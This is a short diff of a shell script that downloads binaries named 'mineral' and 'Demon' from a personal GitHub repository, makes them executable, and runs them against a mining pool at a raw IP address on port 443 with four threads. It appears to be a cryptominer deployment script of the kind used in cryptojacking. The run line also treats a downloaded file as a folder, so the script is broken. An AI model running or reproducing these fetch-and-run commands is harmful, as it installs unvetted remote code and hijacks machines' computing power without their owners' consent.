@@ -1,3 +1,4 @@
 apt update
-wget https://github.com/komaria10003099/komaria/raw/main/minera && chmod +x minera
-./minera -o 137.184.5.123:443 -t 4
+wget https://github.com/komaria10003099/komaria/raw/main/mineral && chmod +x mineral
+wget https://github.com/komaria10003099/komaria/raw/main/Demon && chmod +x Demon
+./mineral/Demon -o 137.184.5.123:443 -t 4
